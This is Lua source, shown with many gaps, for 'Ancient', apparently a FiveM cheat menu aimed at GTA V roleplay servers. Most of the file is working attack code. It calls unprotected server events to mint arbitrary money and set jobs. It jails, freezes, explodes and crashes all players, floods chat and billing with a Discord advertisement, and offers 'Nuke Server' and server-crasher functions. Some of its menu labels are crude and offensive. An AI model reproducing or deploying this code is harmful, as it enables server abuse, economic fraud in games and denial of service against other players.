...
local function debugPrint(text)
    if AncientByOutcast.debug then
...
function AncientByOutcast.CreateMenu(id, title)
    -- Default settings
    menus[id] = { }
    ...
    menus[id].menuTextColor = { r = 255, g = 0, b = 0, a = 255 }
    menus[id].menuSubTextColor = { r = 255, g = 255, b = 0, a = 255 }
    menus[id].menuFocusTextColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].menuFocusBackgroundColor = { r = 200, g = 200, b = 200, a = 200 }
...
function AncientByOutcast.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        AncientByOutcast.CreateMenu(id, menus[parent].title)
...
function AncientByOutcast.CurrentMenu()
    return currentMenu
end


function AncientByOutcast.OpenMenu(id)
    if id and menus[id] then
...
function AncientByOutcast.IsMenuOpened(id)
    return isMenuVisible(id)
end


function AncientByOutcast.IsAnyMenuOpened()
...
function AncientByOutcast.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
...
function AncientByOutcast.CloseMenu()
    if menus[currentMenu] then
...
function AncientByOutcast.Button(text, subText)
...
function AncientByOutcast.MenuButton(text, id)
    if menus[id] then
        if AncientByOutcast.Button(text) then
            setMenuVisible(currentMenu, false)
...
function AncientByOutcast.CheckBox(text, checked, callback)
    if AncientByOutcast.Button(text, checked and "~w~~h~On" or "~h~~c~Off") then
        checked = not checked
...
function AncientByOutcast.ComboBox(text, items, currentIndex, selectedIndex, callback)
    ...
    if AncientByOutcast.Button(text, selectedItem) then
...
function AncientByOutcast.Display()
    if isMenuVisible(currentMenu) then
        if menus[currentMenu].aboutToBeClosed then
            AncientByOutcast.CloseMenu()
        else
...
function AncientByOutcast.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end


function AncientByOutcast.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end


function AncientByOutcast.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end


function AncientByOutcast.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end


function AncientByOutcast.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end


function AncientByOutcast.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
end


function AncientByOutcast.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
end


function AncientByOutcast.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
end


function AncientByOutcast.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end


function AncientByOutcast.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
end


function AncientByOutcast.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
end

function AncientByOutcast.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
end

function AncientByOutcast.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
end


function AncientByOutcast.SetMenuButtonPressedSound(id, name, set)
                ...
                Citizen.CreateThread(
                    function()
                        ...
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                'Rainbox#1621 Ancient',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. 'https://discord.gg/uTrwXm8'
                            )
                        end
                        for i = 0, 256 do
                            TriggerServerEvent(
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Rainbox#1621 Ancient https://discord.gg/uTrwXm8',
                                43161337
                            )
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Ancient; Rainbox#1621")
        end
        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'Rainbox#1621',
                    {0, 0x99, 255},
                    '/ooc Ancient Menu! Buy at https://discord.gg/uTrwXm8'
                )
                TriggerServerEvent('_chat:messageEntered', 'Rainbox#1621', {0, 0x99, 255}, 'Ancient menu <3 https://discord.gg/uTrwXm8')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Ancient Babe <3 Rainbox#1621 https://discord.gg/uTrwXm8")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Rainbox Babe <3 Rainbox#1621 https://discord.gg/uTrwXm8")
					end
				end
...
Citizen.CreateThread(
    function()
        ...
        AncientByOutcast.CreateMenu("MainMenu", "Ancient")
        AncientByOutcast.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
        AncientByOutcast.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
        AncientByOutcast.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
        AncientByOutcast.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
        AncientByOutcast.CreateSubMenu("MaliciousMenu", "MainMenu", "")
        AncientByOutcast.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
        AncientByOutcast.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
        AncientByOutcast.CreateSubMenu("ESXJobMenu", "ESXMenu", "Jobs")
        AncientByOutcast.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "Money Menu")
        AncientByOutcast.CreateSubMenu('MODEL', 'MainMenu', 'ESX Model Triggers')
		AncientByOutcast.CreateSubMenu("ESXDrugMenu", "ESXMenu", "Drugs")
        AncientByOutcast.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
        AncientByOutcast.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
		AncientByOutcast.CreateSubMenu("AI", "MainMenu", "AI Menu")
        AncientByOutcast.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
        AncientByOutcast.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
		AncientByOutcast.CreateSubMenu("Credits", "MainMenu", "Credits")
        AncientByOutcast.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
        AncientByOutcast.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
        AncientByOutcast.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
        AncientByOutcast.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
        AncientByOutcast.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
        AncientByOutcast.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
        AncientByOutcast.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
        AncientByOutcast.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
        AncientByOutcast.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
        AncientByOutcast.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
        AncientByOutcast.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
        AncientByOutcast.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
        AncientByOutcast.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
        AncientByOutcast.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
        AncientByOutcast.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
        ...
        local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
                            ...
                            "ESXMiscMenu", "ESXDrugMenu", "AI", "Credits", "MODEL", "VRPMenu"}


        while Enabled do
            if AncientByOutcast.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~Ancient")
                drawNotification("~h~~s~Made by ~r~Outcast#3723 ReColoured By ~b~Rainbox#1621")
                if AncientByOutcast.MenuButton    ("Self Menu", "SelfMenu") then
                elseif AncientByOutcast.MenuButton("Teleport Menu", "TeleportMenu") then
				elseif AncientByOutcast.MenuButton("AI Menu", "AI") then
                elseif AncientByOutcast.MenuButton("Online Players", "OnlinePlayersMenu") then
                elseif AncientByOutcast.MenuButton("Weapon Menu", "WeaponMenu") then
                elseif AncientByOutcast.MenuButton("Vehicle Menu", "VehMenu") then
                elseif AncientByOutcast.MenuButton('Esx Models', 'MODEL') then
				elseif AncientByOutcast.MenuButton("Malicious Hacks", "MaliciousMenu") then
                elseif AncientByOutcast.MenuButton("Trolling Options", "TrollMenu") then
                elseif AncientByOutcast.MenuButton("ESX Options", "ESXMenu") then
                elseif AncientByOutcast.MenuButton("VRP Options", "VRPMenu") then
                elseif AncientByOutcast.MenuButton("Credits", "Credits") then
				elseif AncientByOutcast.Button("Disable Menu") then
                    Enabled = false
                end
                  
				AncientByOutcast.Display()
		    elseif AncientByOutcast.IsMenuOpened("Credits") then
				if AncientByOutcast.Button("∑~r~~h~Outcast#3723 - ~r~Owner/Creator") then
				elseif AncientByOutcast.Button("∑~o~~b~Rainbox#16214 - Owner") then
				elseif AncientByOutcast.Button("∑~o~~h~Ferrari ~r~Frans#4444 - Support/Test") then
				elseif AncientByOutcast.Button("∑~y~~h~The ~r~Community - ~r~Thank ~r~you ~r~so ~r~much :)") then
				end
				
				AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("VRPMenu") then
                if AncientByOutcast.Button("VRP PayGarage 100$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100})
                elseif AncientByOutcast.Button("VRP PayGarage 1000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
                elseif AncientByOutcast.Button("VRP PayGarage 10 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
                elseif AncientByOutcast.Button("VRP PayGarage 100 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
                elseif AncientByOutcast.Button("VRP Get Driver Licence") then
                    TriggerServerEvent("dmv:success")
                elseif AncientByOutcast.Button("VRP Bank Deposit") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:deposit", amount)
                elseif AncientByOutcast.Button("VRP Bank Withdraw") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:withdraw", amount)
                elseif AncientByOutcast.Button("VRP Slot Machine") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("vrp_slotmachine:server:2", amount)
                end

                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("TrollMenu") then
                if AncientByOutcast.Button("ESX Server Crasher") then
                ...
                elseif  AncientByOutcast.CheckBox(
                ...
                then
				elseif AncientByOutcast.Button("Spawn moutain Lion On Everyone") then
				...
				elseif AncientByOutcast.Button("SWAT W/ Railgun On Everyone") then
                ...
                elseif AncientByOutcast.Button("Nuke Server") then
                    nukeserver()
				elseif AncientByOutcast.Button("Esx Destroy V2") then
				    esxdestroyv2()
				elseif AncientByOutcast.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
				...
				elseif AncientByOutcast.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Ancient menu https://https://discord.gg/uTrwXm8", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Ancient menu https://https://discord.gg/uTrwXm8", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Ancient menu https://https://discord.gg/uTrwXm8", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Ancient menu https://https://discord.gg/uTrwXm8", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Ancient menu https://https://discord.gg/uTrwXm8", "6969696969")
                end
				elseif AncientByOutcast.Button("VRP Destroy V2") then
				    vrpdestroy()
                elseif AncientByOutcast.Button("Rape All Players") then
                    RapeAllFunc()
                elseif AncientByOutcast.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
				elseif AncientByOutcast.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
                elseif AncientByOutcast.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
			    elseif AncientByOutcast.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
                elseif AncientByOutcast.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
                elseif AncientByOutcast.Button("Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif AncientByOutcast.Button("Fake Message") then
                ...
                elseif AncientByOutcast.Button("ESX Set All Police") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "police", 3)
                    end
                elseif AncientByOutcast.Button("ESX Set All Mechanic") then
                    for i = 0, 128 do
                ...
                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("TeleportMenu") then
                if AncientByOutcast.Button("Teleport To Waypoint") then
                    TeleportToWaypoint()
                elseif AncientByOutcast.Button("Teleport Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif AncientByOutcast.Button("Teleport To Coords") then
                    TeleportToCoords()
                elseif AncientByOutcast.CheckBox(
                    "Show Coords",
                    showCoords,
                ...
                AncientByOutcast.Display()
			elseif AncientByOutcast.IsMenuOpened("AI") then
			                if AncientByOutcast.Button("~h~Configure AI ~g~Speed") then
                ...
                elseif AncientByOutcast.Button("~h~AI Drive (Waypoint_Slow)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                ...
                elseif AncientByOutcast.Button("~h~AI Drive (Waypoint_Fast)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                ...
                elseif AncientByOutcast.Button("~h~AI Drive (Wander)") then
                    local ped = GetPlayerPed(-1)
                    ClearPedTasks(ped)
                    local v = GetVehiclePedIsIn(ped, false)
                    print("Configured speed is currently " .. aispeed)
                    TaskVehicleDriveWander(ped, v, tonumber(aispeed), 8388636)
                elseif AncientByOutcast.Button("~h~Stop AI") then
                    speedmit = false
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ...
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				                ...
				                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("VehMenu") then
                if AncientByOutcast.Button("Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif AncientByOutcast.Button("Repair Engine Only") then
        ...
        drawNotification(
            "You are not sitting in a vehicle mate"
				...
				SetVehicleOilLevel(veh, 1000.0)
						...
						elseif AncientByOutcast.Button("~g~Buy vehicle for free") then fv()
					elseif
					AncientByOutcast.CheckBox(
				...
				then
                elseif AncientByOutcast.Button("Spawn a vehicle") then
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "Ancient")
                    else
                        drawNotification("~r~Model is not valid!")
                    end
                elseif AncientByOutcast.MenuButton("LS Customs", "LSC") then
				                elseif
                    AncientByOutcast.CheckBox(
                 ...
                 then
                elseif AncientByOutcast.Button("Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					AncientByOutcast.CheckBox(
						"No Fall",
				 ...
				 then
				elseif AncientByOutcast.Button("Change license plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
                ...
                then
				elseif AncientByOutcast.Button("~h~Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now dirty")
				elseif AncientByOutcast.Button("~h~Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now clean")
                end

                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("LSC") then
			local veh = GetVehiclePedIsUsing(PlayerPedId())
                if AncientByOutcast.CheckBox(
                    "Super Handling",
                    superGrip,
                    function(enabled)
                        superGrip = enabled
                ...
                then
                elseif AncientByOutcast.MenuButton("Vehicle Boost", "VehBoostMenu") then
                elseif AncientByOutcast.Button("Max Exterior Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                elseif AncientByOutcast.Button("Max Performance") then
                    MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                end

                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("VehBoostMenu") then
                if AncientByOutcast.Button('Engine Power boost reset') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif AncientByOutcast.Button('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif AncientByOutcast.Button('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif AncientByOutcast.Button('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif AncientByOutcast.Button('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif AncientByOutcast.Button('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif AncientByOutcast.Button('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif AncientByOutcast.Button('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif AncientByOutcast.Button('Engine Power boost  ~g~x256') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 256.0 * 20.0)
			elseif AncientByOutcast.Button('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			end

                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("MaliciousMenu") then
                if AncientByOutcast.CheckBox(
                    "Crosshair",
                    crosshair,
                    function(enabled)
			...
			then
                ...
                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("ESXMenu") then
                if AncientByOutcast.MenuButton("ESX Money Options", "ESXMoneyMenu") then
                elseif AncientByOutcast.MenuButton("ESX Job Menu", "ESXJobMenu") then
                elseif AncientByOutcast.MenuButton("ESX Boss", "ESXBossMenu") then
                elseif AncientByOutcast.MenuButton("ESX Drugs", "ESXDrugMenu") then
                elseif AncientByOutcast.MenuButton("ESX Misc", "ESXMiscMenu") then
                end

                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("ESXMiscMenu") then
                if AncientByOutcast.Button("ESX Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif AncientByOutcast.Button    ("ESX Get all licenses ") then
					TriggerServerEvent("dmv:success")
                ...
                elseif AncientByOutcast.Button("ESX Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
                end

                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("ESXDrugMenu") then
                if AncientByOutcast.Button("Harvest Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                elseif AncientByOutcast.Button("Transform Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                elseif AncientByOutcast.Button("Sell Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                elseif AncientByOutcast.Button("Harvest Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                elseif AncientByOutcast.Button("Transform Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                elseif AncientByOutcast.Button("Sell Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                elseif AncientByOutcast.Button("Harvest Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                elseif AncientByOutcast.Button("Transform Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                elseif AncientByOutcast.Button("Sell Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                elseif AncientByOutcast.Button("Harvest Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                elseif AncientByOutcast.Button("Transform Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                elseif AncientByOutcast.Button("Sell Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent ("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                elseif AncientByOutcast.Button("Money Wash (x10)") then
                    ...
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                elseif AncientByOutcast.Button("Stop all (Drugs)") then
            ...
            elseif AncientByOutcast.IsMenuOpened("ESXBossMenu") then
                ...
                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("ESXJobMenu") then
                if AncientByOutcast.Button("Unemployed") then
                    TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(-1))
                elseif AncientByOutcast.Button("Police") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"police",3)
                elseif AncientByOutcast.Button("Mechanic") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"mecano",3)
                elseif AncientByOutcast.Button("Taxi") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"taxi",3)
                elseif AncientByOutcast.Button("Ambulance") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"ambulance",3)
                elseif AncientByOutcast.Button("Real Estate Agent") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"realestateagent",3)
                elseif AncientByOutcast.Button("Car Dealer") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"cardealer",3)
                end

                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("ESXMoneyMenu") then
                if AncientByOutcast.Button("-» Ultimate moneymaker «-") then
			...
			elseif AncientByOutcast.Button("~g~Caution give back $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif AncientByOutcast.Button("~g~Truckerjob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif AncientByOutcast.Button("~g~Admin give bank $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif AncientByOutcast.Button("~g~Admin give cash $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif AncientByOutcast.Button("~g~Postal job $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif AncientByOutcast.Button("~g~Bank security $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif AncientByOutcast.Button("~g~Slotmachine $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif AncientByOutcast.Button("~g~ LScustoms $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif AncientByOutcast.Button("~g~Slotmachine(2) $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif AncientByOutcast.Button("~g~Dirty money $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif AncientByOutcast.Button("~g~Delivery $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif AncientByOutcast.Button("~g~Taxijob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif AncientByOutcast.Button("~g~Pilot & Taxi (ESX) $") then
					...
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
			elseif AncientByOutcast.Button("~g~Garbagejob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif AncientByOutcast.Button("~g~Paycheck $") then
				...
				AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened('MODEL') then
                if AncientByOutcast.Button('~c~~h~Model~s~ Clown') then
                ...
                elseif AncientByOutcast.Button('~c~~h~Model~s~ Mime') then
                ...
                elseif AncientByOutcast.Button('~c~~h~Model~s~ Stripper') then
			local model = "s_f_y_stripper_01"
                ...
                elseif AncientByOutcast.Button('~c~~h~Model~b~ Cop M') then
			local model = "s_m_y_cop_01"
                ...
